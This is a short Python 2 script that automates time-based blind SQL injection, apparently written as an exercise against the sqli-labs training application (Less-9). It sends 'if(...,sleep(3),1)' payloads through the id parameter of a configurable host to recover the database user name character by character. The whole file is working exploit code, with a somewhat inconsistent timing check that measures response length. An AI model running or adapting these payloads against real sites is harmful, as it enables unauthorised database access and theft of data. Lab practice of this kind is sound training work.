#__author__ = 'ning-pc'
#!/usr/bin/env python
#mysql_timebased.py
import httplib
import urllib
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0'}
payloads = 'abcdefghijklmnopqrstuvwxyz1234567890.@_*%'
def GetUlength():
    userlen = 0
    for i in range(1,99):
        s1 = "length(user())=%s" % i
        s = "if("+s1+",sleep(3),1)--+"
        url = "/sqli-labs/Less-9/index.php?id=1'/**/and/**/%s" % s
        conn = httplib.HTTPConnection('www.8.com',timeout=5)
        conn.request(method='GET',headers=headers,url=url)
        res = conn.getresponse()
        length = len(res.read())
        if length>706:
            print i
            exit()
        else:
            print '*'

def GetUser():
    user = ''
    for i in range(1,19):
        for payload in payloads:
            s1 = "ascii(mid(lower(user()),%s,1))=%s" % (i,ord(payload))
            s = "if("+s1+",sleep(3),1)--+"
            url = "/sqli-labs/Less-9/index.php?id=1'/**/and/**/%s" % s
            conn = httplib.HTTPConnection('www.8.com',timeout=5)
            conn.request(method='GET',headers=headers,url=url)
            resp = conn.getresponse()
            html_header= resp.read()
            length = len(html_header)
            if length>706:
                print payload
            conn.close()
def main():
    userlen = GetUlength()
    print "user length:\n",userlen
    # current_user = GetUser(userlen)
    # print "\n CurrentUser is :",current_user
if __name__ == '__main__':
    print 'mysql-timebased-sqlinjection:\n'
    # GetUlength()
    GetUser()

